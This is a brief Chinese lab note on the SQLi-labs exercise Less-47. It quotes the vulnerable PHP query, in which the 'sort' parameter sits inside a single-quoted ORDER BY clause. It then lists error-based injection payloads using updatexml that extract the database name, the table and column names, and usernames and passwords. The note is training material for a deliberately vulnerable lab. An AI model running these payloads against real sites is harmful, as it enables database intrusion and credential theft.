---
title: less47
url: https://www.yuque.com/u29002979/ep2zrx/kx2cvm13e1ioy8kb
---

```bash
$id=$_GET['sort'];	

$sql = "SELECT * FROM users ORDER BY '$id'";
```

闭合方式为单引号' <a name="qjWYr"></a>

# 注入点检查

`?sort=1'`

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1

单引号'闭合 <a name="gX6OV"></a>

# 报错注入

```bash
查询数据库表
?sort=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- +
爆破数据表
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
爆破字段名
?sort=1' and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) -- +
爆破字段
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users limit 0,1),0x7e),1) -- +
```
